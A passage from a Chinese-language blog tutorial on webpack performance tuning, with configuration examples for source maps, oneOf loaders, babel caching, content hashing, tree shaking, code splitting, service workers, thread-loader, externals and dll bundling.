<td>&#x6BCF;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4F1A;&#x8FFD;&#x52A0; source-map&#xFF0C;&#x90FD;&#x5728; eval&#x3002;&#x80FD;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#xFF0C;&#x80FD;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#xFF0C;&#x591A;&#x4E86;&#x54C8;&#x5E0C;&#x503C;&#x3002;</td>
</tr>
<tr>
<td>nosource</td>
<td>&#x540C;&#x6837;&#x751F;&#x6210;&#x5916;&#x90E8; source-map&#x3002;&#x80FD;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#xFF0C;&#x4E0D;&#x80FD;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x3002;&#x9632;&#x6B62;&#x6E90;&#x4EE3;&#x7801;&#x6CC4;&#x6F0F;&#x3002;</td>
</tr>
<tr>
<td>cheap</td>
<td>&#x751F;&#x6210;&#x5916;&#x90E8; source-map&#x3002;&#x80FD;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#xFF0C;&#x80FD;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#xFF0C;&#x63D0;&#x793A;&#x5230;&#x5177;&#x4F53;&#x7684;&#x4E00;&#x884C;&#x3002;</td>
</tr>
<tr>
<td>cheap-module</td>
<td>&#x751F;&#x6210;&#x5916;&#x90E8; source-map&#x3002;&#x80FD;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#xFF0C;&#x80FD;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#xFF0C;&#x63D0;&#x793A;&#x5230;&#x5177;&#x4F53;&#x7684;&#x884C;&#x5217;&#x3002;&#x4E14;&#x52A0;&#x4E0A; loader &#x4E2D;&#x52A0;&#x5165;&#x3002;</td>
</tr>
</tbody>
</table>
<ul>
<li>oneOf</li>
</ul>
<p>&#x5728;&#x5339;&#x914D; loader &#x65F6;&#x4F1A;&#x8FDB;&#x884C;&#x591A;&#x6B21;&#x5339;&#x914D;&#xFF0C;&#x4F7F;&#x7528; <code>oneOf</code> &#x8868;&#x793A;&#x4E00;&#x4E0B;&#x6570;&#x7EC4;&#x4E2D;&#x7684; loader &#x4EC5;&#x4F1A;&#x5339;&#x914D;&#x4E00;&#x4E2A;&#xFF0C;&#x8282;&#x7701;&#x65F6;&#x95F4;&#x4E0E;&#x529F;&#x8017;&#x3002;&#x7C7B;&#x4F3C;&#x4E8E; React &#x7684; Switch&#x3002;</p>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;);
const OptimizeCssAssetsWebpackPlugin = require(&apos;optimize-css-assets-webpack-plugin&apos; );
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
// &#x5B9A;&#x4E49; nodejs &#x73AF;&#x5883;&#x53D8;&#x91CF;: &#x51B3;&#x5B9A;&#x4F7F;&#x7528; browserslist &#x7684;&#x54EA;&#x4E2A;&#x73AF;&#x5883; 
process.env.NODE_ENV = &apos;production&apos;;
// &#x590D;&#x7528; loader 
const commonCssLoader = [
  MiniCssExtractPlugin.loader,
  &apos;css-loader&apos;,
  { 
    loader: &apos;postcss-loader&apos;,
    options: {
      ident: &apos;postcss&apos;, 
      plugins: () =&gt; [require(&apos;postcss-preset-env&apos;)()] 
    } 
  } 
];
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: { filename: &apos;js/built.js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  module: { 
    rules: [
      {
        // &#x4EE5;&#x4E0B; loader &#x53EA;&#x4F1A;&#x5339;&#x914D;&#x4E00;&#x4E2A; &#x8282;&#x7701;&#x65F6;&#x95F4;&#x4E0E;&#x5185;&#x5B58;&#x635F;&#x8017;
        // &#x6CE8;&#x610F;: &#x4E0D;&#x80FD;&#x4E24;&#x4E2A; loader &#x5904;&#x7406;&#x540C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;
        { // &#x5728; package.json &#x4E2D; eslintConfig --&gt; airbnb 
        		test: /\.js$/,
        		exclude: /node_modules/,
        		// &#x4F18;&#x5148;&#x6267;&#x884C; &#x4E0D;&#x8BBA;&#x653E;&#x5728;&#x54EA;&#x91CC;&#x7684;&#x4F4D;&#x7F6E;!!!
        		enforce: &apos;pre&apos;, 
        		loader: &apos;eslint-loader&apos;,
        		options: { fix: true }
      		}
      },
      {
        oneOf: [
          { test: /\.css$/, use: [...commonCssLoader] },
      		{ test: /\.less$/, use: [...commonCssLoader, &apos;less-loader&apos;] },
        	// &#x4E0D;&#x80FD;&#x4E24;&#x4E2A; loader &#x5904;&#x7406;&#x540C;&#x4E00;&#x7C7B;&#x6587;&#x4EF6; -- &#x63D0;&#x51FA;
      		/* { // &#x5728; package.json &#x4E2D; eslintConfig --&gt; airbnb 
        		test: /\.js$/,
        		exclude: /node_modules/,
        		// &#x4F18;&#x5148;&#x6267;&#x884C; &#x4E0D;&#x8BBA;&#x653E;&#x5728;&#x54EA;&#x91CC;&#x7684;&#x4F4D;&#x7F6E;!!!
        		enforce: &apos;pre&apos;, 
        		loader: &apos;eslint-loader&apos;,
        		options: { fix: true }
      		}, */
      		{
        		test: /\.js$/,
        		exclude: /node_modules/,
        		loader: &apos;babel-loader&apos;,
        		options: {
          		presets: [
            		[
              		&apos;@babel/preset-env&apos;,
              		{
                		useBuiltIns: &apos;usage&apos;, corejs: {version: 3},
                		targets: { chrome:&apos;60&apos;, firefox: &apos;50&apos; }
              		}
            		]
          		]
        		}
      		},
      		{ 
        		test: /\.(jpg|png|gif)/,
        		loader: &apos;url-loader&apos;,
        		options: { limit: 8 * 1024, name: &apos;[hash:10].[ext]&apos;, outputPath: &apos;imgs&apos;, esModule: false }
      		},
            { test: /\.html$/, loader: &apos;html-loader&apos; },
      		{ 
        		exclude: /\.(js|css|less|html|jpg|png|gif)/,
        		loader: &apos;file-loader&apos;,
        		options: { outputPath: &apos;media&apos; }
      		}
        ]
      }	
    ]
  },
  plugins:[ 
    new MiniCssExtractPlugin({ filename: &apos;css/built.css&apos; }),
    new OptimizeCssAssetsWebpackPlugin(),
    new HtmlWebpackPlugin({ 
      template: &apos;./src/index.html&apos;,
      minify: { collapseWhitespace: true, removeComments: true}
    })
  ],
  mode: &apos;production&apos; 
};
</code></pre>
<ul>
<li>babel &#x7F13;&#x5B58;</li>
</ul>
<p>&#x8003;&#x8651;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x80FD;&#x7528; HMR &#x529F;&#x80FD;&#xFF0C;&#x56E0;&#x4E3A; HMR &#x57FA;&#x4E8E; devServer &#x3002;&#x5728; babel &#x8FDB;&#x884C;&#x7FFB;&#x8BD1;&#x65F6;&#xFF0C;&#x5E94;&#x8BE5;&#x65F6;&#x66F4;&#x6539;&#x6587;&#x4EF6;&#x53D8;&#x5316;&#x800C;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x4E0D;&#x53D8;&#xFF0C;&#x6B64;&#x65F6;&#x5E94;&#x8BE5;&#x5F00;&#x542F; babel &#x7F13;&#x5B58;&#xFF0C;&#x5C06;&#x4E4B;&#x524D;&#x7F16;&#x8BD1;&#x597D;&#x7684;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x5904;&#x7406;&#x3002;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x6CA1;&#x6709;&#x53D8;&#x5316;&#x5219;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x7F13;&#x5B58;&#x800C;&#x4E0D;&#x662F;&#x518D;&#x6784;&#x5EFA;&#x4E00;&#x6B21;&#x3002;</p>
<pre><code class="language-javascript">...{ 
  // babel &#x7F13;&#x5B58;
  test: /\.js$/, 
  exclude: /node_modules/, 
  loader: &apos;babel-loader&apos;, 
  options: { 
    presets: [ 
      [ 
        &apos;@babel/preset-env&apos;, 
        { 
          useBuiltIns: &apos;usage&apos;, 
          corejs: { version: 3 },
          targets: { chrome: &apos;60&apos;, firefox: &apos;50&apos; } 
        } 
      ]
    ],
    // &#x5F00;&#x542F; babel &#x7F13;&#x5B58; 
    // &#x7B2C;&#x4E8C;&#x6B21;&#x6784;&#x5EFA;&#x65F6;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;&#x4E4B;&#x524D;&#x7684;&#x7F13;&#x5B58; 
    cacheDirectory: true 
  } 
},...
</code></pre>
<p>&#x6587;&#x4EF6;&#x8D44;&#x6E90;&#x7F13;&#x5B58;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x540D;&#x2014;&#x2014;&#x589E;&#x52A0; hash &#x503C;&#x3002;<strong>&#x6BCF;&#x6B21;&#x6784;&#x5EFA; webpack &#x751F;&#x6210;&#x552F;&#x4E00;&#x7684; hash &#x503C;</strong>&#x3002;&#x90A3;&#x4E48;&#x4F1A;&#x56E0;&#x4E3A; <code>.js</code> &#x548C; <code>.css</code> &#x4F7F;&#x7528;&#x552F;&#x4E00;&#x4E00;&#x4E2A; hash &#x503C;&#x5BFC;&#x81F4;&#x6240;&#x6709;&#x7F13;&#x5B58;&#x5931;&#x6548;&#xFF08;&#x6539;&#x52A8;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF09;&#x3002;&#x90A3;&#x4E48;&#x8003;&#x8651; chunkhash &#x503C;&#xFF0C;&#x6839;&#x636E; chunk &#x751F;&#x6210;&#x7684; hash &#x503C;&#xFF0C;&#x5982;&#x679C;&#x6253;&#x5305;&#x6765;<strong>&#x6E90;&#x4E8E;&#x540C;&#x4E00;&#x4E2A; chunk</strong> &#xFF0C;&#x90A3;&#x4E48; hash &#x503C;&#x4E00;&#x6837;&#x3002;&#xFF08;&#x6240;&#x6709;&#x6839;&#x636E;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x88AB;&#x5F15;&#x5165;&#x7684;&#x6587;&#x4EF6;&#x90FD;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A; chunk&#xFF09;&#x3002;&#x6700;&#x7EC8;&#x9009;&#x62E9; contenthash &#xFF0C;<strong>&#x6839;&#x636E;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x751F;&#x6210; hash &#x503C;</strong>&#xFF0C;&#x4E0D;&#x540C;&#x6587;&#x4EF6; hash &#x503C;&#x4E00;&#x5B9A;&#x4E0D;&#x4E00;&#x6837;&#x3002;</p>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;);
const OptimizeCssAssetsWebpackPlugin = require(&apos;optimize-css-assets-webpack-plugin&apos; );
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
// &#x5B9A;&#x4E49; nodejs &#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF1A;&#x51B3;&#x5B9A;&#x4F7F;&#x7528; browserslist &#x7684;&#x54EA;&#x4E2A;&#x73AF;&#x5883; 
process.env.NODE_ENV = &apos;production&apos;; 
// &#x590D;&#x7528; loader
const commonCssLoader = [ 
  MiniCssExtractPlugin.loader,
  &apos;css-loader&apos;,
  { // &#x8FD8;&#x9700;&#x8981;&#x5728; package.json &#x4E2D;&#x5B9A;&#x4E49; browserslist
    loader: &apos;postcss-loader&apos;,
    options: {
      ident: &apos;postcss&apos;,
      plugins: () =&gt; [require(&apos;postcss-preset-env&apos;)()] } 
  }
];
module.exports = { 
  entry: &apos;./src/js/index.js&apos;,
  output: {
    // contenthash
    filename: &apos;js/built.[contenthash:10].js&apos;,
    path: resolve(__dirname, &apos;build&apos;)
  },
  module: {
    rules: [
      { // &#x5728; package.json &#x4E2D; eslintConfig --&gt; airbnb
        test: /\.js$/, exclude: /node_modules/,
        // &#x4F18;&#x5148;&#x6267;&#x884C; 
        enforce: &apos;pre&apos;,
        loader: &apos;eslint-loader&apos;,
        options: { fix: true } 
      },
      { 
        // &#x4EE5;&#x4E0B; loader &#x53EA;&#x4F1A;&#x5339;&#x914D;&#x4E00;&#x4E2A;
        // &#x6CE8;&#x610F;&#xFF1A;&#x4E0D;&#x80FD;&#x6709;&#x4E24;&#x4E2A;&#x914D;&#x7F6E;&#x5904;&#x7406;&#x540C;&#x4E00;&#x79CD;&#x7C7B;&#x578B;&#x6587;&#x4EF6;
        oneOf: [
          { test: /\.css$/, use: [...commonCssLoader] },
          { test: /\.less$/, use: [...commonCssLoader, &apos;less-loader&apos;] },
          /*&#x6B63;&#x5E38;&#x6765;&#x8BB2;&#xFF0C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x53EA;&#x80FD;&#x88AB;&#x4E00;&#x4E2A; loader &#x5904;&#x7406;&#x3002; &#x5F53;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x8981;&#x88AB;&#x591A;&#x4E2A; loader &#x5904;&#x7406;&#xFF0C;&#x90A3;&#x4E48;&#x4E00;&#x5B9A;&#x8981;&#x6307;&#x5B9A; loader &#x6267;&#x884C;&#x7684;&#x5148;&#x540E;&#x987A;&#x5E8F;&#xFF1A; &#x5148;&#x6267;&#x884C; eslint &#x5728;&#x6267;&#x884C; babel */
          {
            test: /\.js$/,
            exclude: /node_modules/,
            loader: &apos;babel-loader&apos;,
            options:
            {
              presets:[
                [
                  &apos;@babel/preset-env&apos;,
                  {
                    useBuiltIns: &apos;usage&apos;,
                    corejs: { version: 3 },
                    targets: { chrome: &apos;60&apos;, firefox: &apos;50&apos; }
                  }
                ]
              ],
							// &#x5F00;&#x542F; babel &#x7F13;&#x5B58; 
							// &#x7B2C;&#x4E8C;&#x6B21;&#x6784;&#x5EFA;&#x65F6;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;&#x4E4B;&#x524D;&#x7684;&#x7F13;&#x5B58; 
              cacheDirectory: true
            }
          },
          {
            test: /\.(jpg|png|gif)/,
            loader: &apos;url-loader&apos;,
            options: { limit: 8 * 1024, name: &apos;[hash:10].[ext]&apos;, outputPath: &apos;imgs&apos;, esModule: false } },
          {
            test: /\.html$/,
            loader: &apos;html-loader&apos;
          },
          {
            exclude: /\.(js|css|less|html|jpg|png|gif)/,
            loader: &apos;file-loader&apos;,
            options: { outputPath: &apos;media&apos; } 
          } 
        ] 
      } 
    ] 
  },
  plugins: [
    // contenthash
    new MiniCssExtractPlugin({ filename: &apos;css/built.[contenthash:10].css&apos; }),
    new OptimizeCssAssetsWebpackPlugin(),
    new HtmlWebpackPlugin({
      template: &apos;./src/index.html&apos;,
      minify: { collapseWhitespace: true, removeComments: true } 
    }) 
  ],
  mode: &apos;production&apos;,
  devtool: &apos;source-map&apos; 
};
</code></pre>
<ul>
<li><a href="https://webpack.js.org/guides/tree-shaking/#root">Tree Shaking</a></li>
</ul>
<p>tree shaking &#x53EF;&#x79FB;&#x9664; JavaScript &#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x672A;&#x5F15;&#x7528;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x4F18;&#x5316;&#x6253;&#x5305;&#x4F53;&#x79EF;&#x3002;&#x5229;&#x7528; ES6 &#x7684;&#x6A21;&#x5757;&#x5316;&#x89C4;&#x8303;&#x5F15;&#x5165;&#x9759;&#x6001;&#x5206;&#x6790;&#xFF0C;&#x6545;&#x800C;&#x53EF;&#x4EE5;&#x5728;&#x7F16;&#x8BD1;&#x7684;&#x65F6;&#x5019;&#x5224;&#x65AD;&#x5B9E;&#x9645;&#x52A0;&#x8F7D;&#x7684;&#x5177;&#x4F53;&#x6A21;&#x5757;&#xFF0C;&#x4EE5;&#x53CA;&#x672A;&#x88AB;&#x4F7F;&#x7528;&#x7684;&#x53D8;&#x91CF;&#x6216;&#x8005;&#x5F15;&#x7528;&#xFF0C;&#x8FDB;&#x800C;&#x5220;&#x9664;&#x5BF9;&#x5E94;&#x4EE3;&#x7801;&#x3002;&#x5F53;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684; mode &#x5F00;&#x542F;&#x751F;&#x4EA7;&#x73AF;&#x5883; production &#x65F6;&#xFF0C;&#x4F1A;&#x88AB;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#x3002;</p>
<blockquote>
<p>&#x6240;&#x6709;&#x5BFC;&#x5165;&#x7684;&#x6587;&#x4EF6;&#x90FD;&#x4F1A;&#x53D7;&#x5230; tree shaking &#x7684;&#x5F71;&#x54CD;&#x3002;&#x82E5;&#x5728;&#x9879;&#x76EE;&#x4E2D;&#x4F7F;&#x7528;&#x7C7B;&#x4F3C; css-loader &#x5E76; import CSS &#x6587;&#x4EF6;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x5C06;&#x5176;&#x6DFB;&#x52A0;&#x5230; side effect &#x5217;&#x8868;&#x4E2D;&#xFF0C;&#x4EE5;&#x514D;&#x5728;&#x751F;&#x4EA7;&#x6A21;&#x5F0F;&#x4E2D;&#x65E0;&#x610F;&#x7684;&#x88AB;&#x5220;&#x9664;&#x3002;</p>
</blockquote>
<blockquote>
<p>side effect &#x7684;&#x5B9A;&#x4E49;&#x662F;&#x5728;&#x5BFC;&#x5165;&#x65F6;&#x4F1A;&#x6267;&#x884C;&#x7279;&#x6B8A;&#x884C;&#x4E3A;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x4EC5;&#x4EC5;&#x66B4;&#x9732;&#x4E00;&#x4E2A; export &#x6216;&#x591A;&#x4E2A; export&#x3002;</p>
</blockquote>
<p>package.json &#x4E2D;&#x8BBE;&#x7F6E; <code>&quot;sideEffects&quot;: false</code>&#xFF0C;&#x8868;&#x793A;&#x6240;&#x6709;&#x4EE3;&#x7801;&#x90FD;&#x65E0;&#x526F;&#x4F5C;&#x7528;&#xFF0C;&#x90FD;&#x53EF;&#x8FDB;&#x884C; tree shaking&#x3002;</p>
<p>&#x4E3A;&#x907F;&#x514D;&#x8BEF;&#x5220;&#x6837;&#x5F0F;&#x6587;&#x4EF6;&#xFF0C;&#x5E94;&#x5F53;&#x4FEE;&#x6539;&#x4E3A; <code>&quot;sideEffects&quot;: [&quot;*.css&quot;, &quot;*.less&quot;]</code></p>
<pre><code class="language-json">{
  &quot;name&quot;: &quot;your-project&quot;,
  &quot;sideEffects&quot;: [&quot;./src/some-side-effectful-file.js&quot;, &quot;*.css&quot;, &quot;*.less&quot;]
}
</code></pre>
<ul>
<li><a href="https://webpack.js.org/guides/code-splitting/">Code Splitting</a></li>
</ul>
<p>&#x4E3B;&#x8981;&#x5C06; .js &#x4EE3;&#x7801;&#x6309;&#x8DEF;&#x7531;&#x7EF4;&#x5EA6;&#x6216;&#x8005;&#x7EC4;&#x4EF6;&#x5206;&#x5757; chunks&#xFF0C;&#x5B8C;&#x6210;&#x6309;&#x9700;&#x52A0;&#x8F7D;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x5145;&#x5206;&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x7F13;&#x5B58;&#x3002;</p>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  // &#x5355;&#x5165;&#x53E3; 
  // entry: &apos;./src/js/index.js&apos;,
  entry: {
    index: &apos;./src/js/index.js&apos;,
    test: &apos;./src/js/test.js&apos;
  },
  output: {
    // [name]&#xFF1A;&#x53D6;&#x6587;&#x4EF6;&#x540D;
    filename: &apos;js/[name].[contenthash:10].js&apos;,
    path: resolve(__dirname, &apos;build&apos;) 
  },
  plugins: [
    new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos;, minify: { collapseWhitespace: true, removeComments: true } }) ],
  /*1. &#x53EF;&#x4EE5;&#x5C06; node_modules &#x4E2D;&#x4EE3;&#x7801;&#x5355;&#x72EC;&#x6253;&#x5305;&#x4E00;&#x4E2A; chunk &#x6700;&#x7EC8;&#x8F93;&#x51FA; 2. &#x81EA;&#x52A8;&#x5206;&#x6790;&#x591A;&#x5165;&#x53E3; chunk &#x4E2D;&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x516C;&#x5171;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x6709;&#x4F1A;&#x6253;&#x5305;&#x6210;&#x5355;&#x72EC;&#x4E00;&#x4E2A; chunk */
  optimization: { splitChunks: { chunks: &apos;all&apos; } },
  mode: &apos;production&apos;
};
</code></pre>
<ul>
<li><a href="https://webpack.js.org/guides/progressive-web-application/#root">Progressive Web Applications</a></li>
</ul>
<p>&#x6E10;&#x8FDB;&#x5F0F;&#x7F51;&#x7EDC;&#x5F00;&#x53D1;&#x5E94;&#x7528;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x79BB;&#x7EBF;&#x8BBF;&#x95EE;&#x529F;&#x80FD;&#xFF0C;&#x5373;&#x53EF;&#x5C06; web app &#x6539;&#x9020;&#x4E3A; PWA&#x3002;&#x901A;&#x5E38;&#x4F7F;&#x7528;&#x63D2;&#x4EF6; workbox-webpack-plugin &#x521B;&#x5EFA; Service Worker &#x5B8C;&#x6210;&#x6B64;&#x529F;&#x80FD;&#x3002;</p>
<pre><code class="language-javascript">// package.json
// &#x907F;&#x514D; eslint &#x4E0D;&#x8BA4;&#x8BC6; window&#x3001;navigator&#x6B64;&#x7C7B;&#x53D8;&#x91CF;
&quot;eslintConfig&quot;: {
  &quot;extends&quot;: &quot;airbnb-base&quot;,
    &quot;env&quot;: {
      // &#x652F;&#x6301;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x53D8;&#x91CF;
      &quot;browser&quot;: true
    }
}
</code></pre>
<pre><code class="language-javascript">// src/index.js
...
// &#x6CE8;&#x610F;&#x6B64;&#x5904; serviceWorker &#x4E2D; w &#x9996;&#x5B57;&#x6BCD;&#x5927;&#x5199;
if(&apos;serviceWorker&apos; in navigator) {
  window.addEventListener(&apos;load&apos;, () =&gt; {
    navigator.serviceworker.register(&apos;/service-worker.js&apos;)
    .then(() =&gt; {
      console.log(&apos;sw&#x6CE8;&#x518C;&#x6210;&#x529F;~&apos;)
    })
    .catch(() =&gt; {
      console.log(&apos;sw&#x6CE8;&#x518C;&#x5931;&#x8D25;~&apos;)
    })
  })
}
</code></pre>
<pre><code class="language-javascript">...
plugins: [
  new MiniCssExtractPlugin({ filename: &apos;css/built.[contenthash:10].css&apos; }),
  new OptimizeCssAssetsWebpackPlugin(),
  new HtmlWebpackPlugin({
    template: &apos;./src/index.html&apos;,
    minify: { collapseWhitespace: true, removeComments: true }
  }),
  new WorkboxWebpackPlugin.GenerateSW({
    /*1. &#x5E2E;&#x52A9; serviceworker &#x5FEB;&#x901F;&#x542F;&#x52A8; 2. &#x5220;&#x9664;&#x65E7;&#x7684; serviceworker &#x751F;&#x6210;&#x4E00;&#x4E2A; serviceworker &#x914D;&#x7F6E;&#x6587;&#x4EF6;~ */
    clientsClaim: true,
    skipWaiting: true 
  })
],...
</code></pre>
<p>&#x4E0A;&#x8FF0;&#x7684; sw &#x4EE3;&#x7801;&#x5FC5;&#x987B;&#x8FD0;&#x884C;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x53EF;&#x901A;&#x8FC7; serve &#x5FEB;&#x901F;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x5668;</p>
<pre><code class="language-shell">npm i serve -g
serve -s build # &#x542F;&#x52A8;&#x670D;&#x52A1;&#x5668;
</code></pre>
<ul>
<li><a href="https://webpack.js.org/loaders/thread-loader/#root">&#x591A;&#x8FDB;&#x7A0B;&#x6253;&#x5305;</a></li>
</ul>
<p>JavaScript &#x4E3B;&#x7EBF;&#x7A0B;&#x5F15;&#x64CE;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x7684;&#xFF0C;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x53EA;&#x80FD;&#x505A;&#x4E00;&#x4EF6;&#x4E8B;&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x591A;&#x8FDB;&#x7A0B;&#x4F18;&#x5316;&#x6253;&#x5305;&#x901F;&#x5EA6;&#x3002;&#x8FDB;&#x7A0B;&#x542F;&#x52A8;&#x5927;&#x6982;&#x9700;&#x8981;&#x51E0;&#x767E;&#x6BEB;&#x79D2;&#xFF0C;&#x4E14;&#x8FDB;&#x7A0B;&#x901A;&#x4FE1;&#x4E5F;&#x6709;&#x5F00;&#x9500;&#x3002;&#x53EA;&#x6709;&#x5F53;&#x5DE5;&#x4F5C;&#x65F6;&#x95F4;&#x6D88;&#x8017;&#x8F83;&#x957F;&#x65F6;&#xFF0C;&#x624D;&#x4F1A;&#x9009;&#x62E9;&#x591A;&#x8FDB;&#x7A0B;&#x6253;&#x5305;&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5305;, &#x901A;&#x5E38;&#x7ED9; babel-loader &#x4F7F;&#x7528;
npm install --save-dev thread-loader
</code></pre>
<pre><code class="language-javascript">...{
  test: /\.js$/,
	exclude: /node_modules/,
	use: [
    /*&#x5F00;&#x542F;&#x591A;&#x8FDB;&#x7A0B;&#x6253;&#x5305;&#x3002; &#x8FDB;&#x7A0B;&#x542F;&#x52A8;&#x5927;&#x6982;&#x4E3A; 600ms&#xFF0C;&#x8FDB;&#x7A0B;&#x901A;&#x4FE1;&#x4E5F;&#x6709;&#x5F00;&#x9500;&#x3002; &#x53EA;&#x6709;&#x5DE5;&#x4F5C;&#x6D88;&#x8017;&#x65F6;&#x95F4;&#x6BD4;&#x8F83;&#x957F;&#xFF0C;&#x624D;&#x9700;&#x8981;&#x591A;&#x8FDB;&#x7A0B;&#x6253;&#x5305; */
    {
      loader: &apos;thread-loader&apos;,
      options: {
        workers: 2 // &#x8FDB;&#x7A0B; 2 &#x4E2A;
			}
    },...
</code></pre>
<ul>
<li><a href="https://webpack.js.org/configuration/externals/#root">Externals</a></li>
</ul>
<p>&#x9632;&#x6B62;&#x5C06;&#x67D0;&#x4E9B;&#x5305;&#x6253;&#x5305;&#x8FDB;&#x6700;&#x7EC8;&#x7684; bundle.js &#x4E2D;&#x3002;</p>
<pre><code class="language-javascript">mode: &apos;production&apos;,
externals: { 
  // &#x62D2;&#x7EDD; jQuery &#x88AB;&#x6253;&#x5305;&#x8FDB;&#x6765; 
  // &#x5FFD;&#x7565;&#x5E93;&#x540D; -- npm &#x5305;&#x540D;
  jquery: &apos;jQuery&apos; 
}
</code></pre>
<ul>
<li>dll</li>
</ul>
<p>&#x5982;&#x679C;&#x5BF9;&#x7B2C;&#x4E09;&#x65B9;&#x5E93;&#xFF08;jquery&#x3001;react&#x3001;vue...&#xFF09;&#x6253;&#x5305;&#x6210;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4F53;&#x79EF;&#x4F1A;&#x592A;&#x5927;&#xFF0C;&#x901A;&#x8FC7; dll &#x53EF;&#x4EE5;&#x5C06;&#x5E93;&#x62C6;&#x5F00;&#x6253;&#x5305;&#x6210;&#x4E0D;&#x540C;&#x7684; chunk &#x6587;&#x4EF6;&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x63D2;&#x4EF6;
npm i add-asset-html-webpack-plugin -D
</code></pre>
<pre><code class="language-javascript">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
const webpack = require(&apos;webpack&apos;);
const AddAssetHtmlWebpackPlugin = require(&apos;add-asset-html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/index.js&apos;,
  output: {
    filename: &apos;built.js&apos;, path: resolve(__dirname, &apos;build&apos;)
  },
  plugins: [
    new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }),
    // &#x544A;&#x8BC9; webpack &#x54EA;&#x4E9B;&#x5E93;&#x4E0D;&#x53C2;&#x4E0E;&#x6253;&#x5305;&#xFF0C;&#x540C;&#x65F6;&#x4F7F;&#x7528;&#x65F6;&#x7684;&#x540D;&#x79F0;&#x4E5F;&#x5F97;&#x53D8;~ 
    new webpack.DllReferencePlugin({ manifest: resolve(__dirname, &apos;dll/manifest.json&apos;) }),
    // &#x5C06;&#x67D0;&#x4E2A;&#x6587;&#x4EF6;&#x6253;&#x5305;&#x8F93;&#x51FA;&#x53BB;&#xFF0C;&#x5E76;&#x5728; html &#x4E2D;&#x81EA;&#x52A8;&#x5F15;&#x5165;&#x8BE5;&#x8D44;&#x6E90; 
    new AddAssetHtmlWebpackPlugin({ filepath: resolve(__dirname, &apos;dll/jquery.js&apos;) }) ],
  mode: &apos;production&apos; 
};
</code></pre>
<p>&#x76F8;&#x6BD4;&#x4E8E; external &#x5F7B;&#x5E95;&#x4E0D;&#x6253;&#x5305;&#xFF0C;&#x9700;&#x8981; cdn &#x8FDE;&#x63A5;&#x8FDB;&#x6765;&#xFF0C;&#x800C; dll &#x9700;&#x8981;&#x6253;&#x5305;&#x4E00;&#x6B21;&#xFF0C;&#x5C06;&#x6765;&#x4E0D;&#x9700;&#x8981;&#x91CD;&#x590D;&#x6253;&#x5305;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="webpack">webpack &#x914D;&#x7F6E;&#x8BE6;&#x60C5;</h2>
<h3 id="entry">entry</h3>
